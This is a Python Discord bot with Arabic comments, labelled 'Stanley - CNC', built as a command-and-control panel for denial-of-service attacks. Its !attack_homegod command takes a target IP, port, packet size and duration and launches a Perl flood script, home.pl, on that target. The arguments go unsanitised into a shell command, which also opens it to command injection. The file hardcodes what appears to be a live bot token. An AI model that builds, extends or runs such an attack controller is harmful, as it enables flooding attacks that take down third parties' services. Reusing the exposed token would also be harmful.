import discord
from discord.ext import commands
import subprocess
import os
import asyncio

# ================== إعدادات البوت ==================
# تحذير: استخدم متغيرات البيئة لحماية التوكن!
TOKEN = "MTUyNTY3NjMwNzg5NDI0MzM1OA.GyTqG_.w5fG8_sJU0pN6ks1lwRGqm5vJdUY-2DptSz038"
ALLOWED_CHANNEL_ID = 1513410697294254170  # معرف الغرفة المسموح بها

# تهيئة البوت مع صلاحيات قراءة المحتوى
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# ================== حدث تشغيل البوت ==================
@bot.event
async def on_ready():
    print(f'✅ بوت {bot.user} جاهز للعمل!')
    # عرض حالة البوت
    await bot.change_presence(activity=discord.Game(name="!help | !status"))

# ================== دالة التحقق من الصلاحيات ==================
async def check_permissions(ctx):
    """تتحقق من أن الأمر صدر في الغرفة الصحيحة."""
    if ctx.channel.id != ALLOWED_CHANNEL_ID:
        await ctx.send(f"❌ هذا الأمر يعمل فقط في الغرفة المخصصة (ID: {ALLOWED_CHANNEL_ID}).")
        return False
    return True

# ================== الأوامر ==================

@bot.command(name="attack_homegod", aliases=["hg"])
async def attack_homegod(ctx, ip: str, port: int = 80, size: int = 1024, duration: int = 30):
    """!attack_homegod <IP> <port> <packet_size> <time>"""
    if not await check_permissions(ctx): return

    if not os.path.exists("home.pl"):
        await ctx.send("❌ ملف الهجوم (home.pl) غير موجود في المجلد!")
        return

    await ctx.send(f"⚔️ بدء هجوم home-god على {ip}:{port} لمدة {duration} ثانية...")
    try:
        # تنفيذ الأمر بشكل غير متزامن
        cmd = f"perl home.pl {ip} {port} {size} {duration}"
        process = await asyncio.create_subprocess_shell(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = await process.communicate()

        if process.returncode == 0:
            await ctx.send(f"✅ انتهى الهجوم على {ip}:{port} بنجاح.")
        else:
            await ctx.send(f"⚠️ حدث خطأ أثناء تنفيذ الهجوم. الكود: {process.returncode}")
    except Exception as e:
        await ctx.send(f"❌ فشل تنفيذ الهجوم: {e}")

@bot.command(name="status")
async def status(ctx):
    """!status - عرض حالة البوت والغرفة المسموح بها."""
    await ctx.send(f"🟢 البوت شغال | الغرفة المسموح بها: {ALLOWED_CHANNEL_ID}")

@bot.command(name="help")
async def help_command(ctx):
    """!help - عرض الأوامر المتاحة."""
    embed = discord.Embed(
        title="📋 أوامر بوت Stanley - CNC",
        description="استخدم الأوامر التالية في الغرفة المصرح بها.",
        color=0x00ff00
    )
    embed.add_field(name="!attack_homegod <IP> <port> <حجم> <وقت>", value="شن هجوم home-god", inline=False)
    embed.add_field(name="!status", value="عرض حالة البوت", inline=False)
    embed.add_field(name="!help", value="عرض هذه المساعدة", inline=False)
    await ctx.send(embed=embed)

# ================== تشغيل البوت ==================
if __name__ == "__main__":
    if not TOKEN:
        print("❌ خطأ: لم يتم تعيين توكن البوت!")
    else:
        bot.run(TOKEN)
